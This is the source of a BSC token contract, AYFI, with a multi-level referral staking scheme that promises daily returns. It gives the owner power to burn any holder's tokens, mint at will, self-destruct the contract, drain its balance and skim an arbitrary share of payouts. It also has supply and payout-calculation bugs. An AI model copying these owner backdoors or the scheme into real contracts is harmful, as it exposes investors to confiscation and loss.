/**
 *Submitted for verification at BscScan.com on 2021-07-27
*/

pragma solidity ^0.5.10;

//*******************************************************************//
//------------------------ SafeMath Library -------------------------//
//*******************************************************************//

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Should be greater than zero");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "should be less than other");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Should be greater than c");
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "divide by 0");
        return a % b;
    }
}

//**************************************************************************//
//------------------------  AFFIYO YEARN FINANCE   -------------------//

//-------------------------- Symbol - AYFI --------------------------------//
//-------------------------- Token Supply - 150Million   --------------------//
//-------------------------- Decimal - 8 --------------------------------//
//***********************************************************************//  


contract AYFITOKEN {

    using SafeMath for uint256;

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) private _allowed;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _initialSupply;
    
    address payable public owner;
    address public backup_fund_holder;

    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);

    constructor() public {
        _name = "AFFIYO YEARN FINANCE";
        _symbol = "AYFI";
        _decimals = 8;
        _initialSupply = 150000000e8;
        _totalSupply = _initialSupply;
         owner = msg.sender;
         backup_fund_holder = owner;
         _balances[owner] = _balances[owner].add(50000000e8);
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Owner Rights");
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    
    function decimals() public view returns (uint256) {
       return _decimals;
    }

    function balanceOf(address _owner) external view returns (uint256) {
        return _balances[_owner];
    }
    
    function allowance(address _owner, address spender) external view returns (uint256) {
        return _allowed[_owner][spender];
    }
    

    function transfer(address to, uint256 value) external returns (bool) {
        require(value <= _balances[msg.sender] && value > 0, "Insufficient Balance");
        _transfer(msg.sender, to, value);
        return true;
    }

    
    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "Address zero");
        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
         require(value <= _balances[from], "Sender Balance Insufficient");
         require(value <= _allowed[from][msg.sender], "Token should be same as alloted");

        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function burn(address _from, uint256 _value) public onlyOwner returns (bool) {
        _burn(_from, _value);
        return true;
    }

    function mint(uint256 _value) public onlyOwner returns (bool){
        _mint(msg.sender, _value);
        return true;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    function alot_tokens(uint256 _amountOfTokens, address _toAddress) onlyOwner public returns(bool) {
        require(_toAddress != address(0), "address zero");
        require(_balances[msg.sender] >= _amountOfTokens, "Balance Insufficient");
        _balances[_toAddress] = _balances[_toAddress].add(_amountOfTokens);
        _balances[msg.sender] = _balances[msg.sender].sub(_amountOfTokens);
        emit Transfer(owner, _toAddress, _amountOfTokens);
        return true;    
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "address zero");
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }


    function _mint(address account, uint256 value) internal {
        require(account != address(0), "address zero");

        _totalSupply = _totalSupply.add(value);
        _balances[account] = _balances[account].add(value);
        emit Transfer(address(0), account, value);
    }
    

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "address zero");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
 }

contract AYFI is AYFITOKEN {
    struct User {
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 direct_business;
        uint256 downline_business;
        uint256 dire_status;
    }
    
    struct Statistics {
        uint256 total_direct_bonus;
        uint256 total_match_bonus;
        uint256 roi_bonus;
        uint256 total_contract_bonus;
    }
    
    struct Bonus {
        uint256 contract_bonus;
        uint256 c_status1;
    }
    
    mapping(address => User) public users;
    mapping (address => Bonus) public usersBonus;
    mapping (address => Statistics) public total_stat;
    mapping (uint256 => address) public contract_bonus_users;

    uint8[] public ref_bonuses;
    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    uint256 public staking_limit = 25000e8;
    uint256 public contract_staking_limit = 50000000e8;
    uint256 public total_deposited_contract1;
    uint256 public total_backup_fund;
    uint256 public fund_status = 0;
    uint256 public income_cut = 0;
    uint256 public count = 0;
    

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
 
    constructor() public {
        
        ref_bonuses.push(20);
        
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
    }
    
    
   function() payable external {}
    
    
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;
            
            users[_upline].direct_business += _amount;
            if(users[_upline].direct_business >= 250000e8 && usersBonus[_upline].c_status1 == 0) {
                contract_bonus_users[count] = _upline;
                usersBonus[_upline].c_status1 = 1;
                count++;
            }
            
            uint256 total_directs = users[_upline].referrals;
            uint40 direct_time_con = uint40(users[_upline].deposit_time) + 240 hours;
            
            if(total_directs >= 10 && uint40(block.timestamp) <= direct_time_con && users[_upline].direct_business >= 50000e8) {
                users[_upline].dire_status = 1;
            }
            emit Upline(_addr, _upline);

            total_users++;
            address _uplines = _upline;

            for(uint8 j = 0; j < ref_bonuses.length; j++) {
                if(_uplines == address(0)) break;

                users[_uplines].total_structure++;
                users[_uplines].downline_business = users[_uplines].downline_business.add(_amount);

                _uplines = users[_uplines].upline;
            }
        }
    }
    
    function _deposit(address _addr, uint256 _amount) private {
         
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        require(_amount <= _balances[_addr], "insufficient Balance");
        
        if(users[_addr].deposit_time > 0) {

            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount , "Deposit should be same as previous or greater than previous");
            require(total_deposited <= contract_staking_limit, "Staking Limit Exceeded");
            require(_amount >= 2500e8 && ( _amount % 2500e8 ) == 0 && _amount <= staking_limit, "Min. staking is 2500 and Max. is 250000 AYFI");
        }
        else require(_amount >= 2500e8 && ( _amount % 2500e8 ) == 0 && _amount <= staking_limit, "Min. staking is 2500 and Max. is 250000 AYFI");
        require( total_deposited <= contract_staking_limit, "Staking Limit Exceeded");
          
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].direct_bonus = 0;
        users[_addr].dire_status = 0;
        users[_addr].match_bonus = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        _balances[_addr] = _balances[_addr].sub(_amount);
        
        total_deposited += _amount;
        total_deposited_contract1 += _amount;
        
        if(total_deposited_contract1 >= 2500000e8 && total_deposited_contract1 <= 10000000e8 && count > 0) {
            uint256 dist_amount = total_deposited_contract1 * 3 / 100;
            uint256 exact_amount = dist_amount / count;
            total_deposited_contract1 = 0;
            
            for(uint8 i = 0; i < count; i++) {
                usersBonus[contract_bonus_users[i]].contract_bonus = usersBonus[contract_bonus_users[i]].contract_bonus.add(exact_amount);
            }
        } 
        
        
        emit NewDeposit(_addr, _amount);
        
        
        if(users[_addr].upline != address(0)) {
            uint256 per = _amount * 10 / 100;
            users[users[_addr].upline].direct_bonus += per;
            
            total_stat[users[_addr].upline].total_direct_bonus += per;
            emit DirectPayout(users[_addr].upline, _addr, per);
        }
    }
    
    
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint dir = users[up].referrals * 2;
            
            if((dir >= i + 1 && i < 19)) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;
                total_stat[up].total_match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
     }

    function deposit(address _upline, uint256 _amount) external {
        _setUpline(msg.sender, _upline, _amount);
        _deposit(msg.sender, _amount);
    }
    
    
    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");
        total_stat[msg.sender].roi_bonus += to_payout;
        
        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }
        
        // Contract payout
        if(users[msg.sender].payouts < max_payout && usersBonus[msg.sender].contract_bonus > 0) {
            uint256 contract_bonus = usersBonus[msg.sender].contract_bonus;

            if(users[msg.sender].payouts + contract_bonus > max_payout) {
                contract_bonus = max_payout - users[msg.sender].payouts;
            }

            usersBonus[msg.sender].contract_bonus -= contract_bonus;
            users[msg.sender].payouts += contract_bonus;
            to_payout += contract_bonus;
        }
        
        require(to_payout > 0, "zero payout");
        uint256 entire_payout = to_payout;
        uint256 entire;
        
        users[msg.sender].total_payouts += entire_payout;
        total_withdraw += entire_payout;
        
        if(fund_status == 1) {
            uint256 backup_fund = entire_payout * income_cut / 100;
             entire = entire_payout - backup_fund;    
            _balances[backup_fund_holder] = _balances[backup_fund_holder].add(backup_fund);
            total_backup_fund = total_backup_fund.add(backup_fund);
        } else {
             entire = entire_payout;
        }
        
        _balances[msg.sender] = _balances[msg.sender].add(entire);
        emit Withdraw(msg.sender, entire);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) view external returns(uint256) {
        uint256 _per;
        if(users[msg.sender].dire_status == 1) {
            _per = _amount * 300 / 100;
        } else {
            _per = _amount * 220 / 100;
        }
        return _per;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if( users[_addr].deposit_payouts < max_payout ) {
            
            uint256 roi_per = 60;
            payout = (((users[_addr].deposit_amount * roi_per)/ 10000)*((block.timestamp - users[_addr].deposit_time) / 1 days)) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    function destruct() external {
        require(msg.sender == owner, "Permission denied");
        selfdestruct(owner);
    }
    
    function ayfi_getter( uint _amount) external {
        require(msg.sender == owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function update_status(uint40 _cut) external {
        require(msg.sender == owner,'Permission denied');
        if (fund_status == 0) {
            fund_status = 1;
        } else {
            fund_status = 0;
        }
         income_cut = _cut;
     }
        
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 match_bonus, uint256 direct_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].match_bonus, users[_addr].direct_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals,uint256 total_structure, uint256 _downline_business, uint256 _direct_business, uint256 _contract_bonus,  uint256 _dire_status) {
        return (users[_addr].referrals, users[_addr].total_structure, users[_addr].downline_business, users[_addr].direct_business, usersBonus[_addr].contract_bonus, users[_addr].dire_status);
    }
    
    function userTotalStatistics(address _addr) view external returns(uint256 _total_direct_bonus, uint256 _total_match_bonus, uint256 _roi_bonus, uint256 _contract_bonus,  uint256 _user_all_deposit, uint256 _all_time_received) {
        return (total_stat[_addr].total_direct_bonus, total_stat[_addr].total_match_bonus, total_stat[_addr].roi_bonus, total_stat[_addr].total_contract_bonus, users[_addr].total_deposits, users[_addr].total_payouts);
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 _total_backup_fund) {
        return (total_users, total_deposited, total_withdraw, total_backup_fund);
    }
}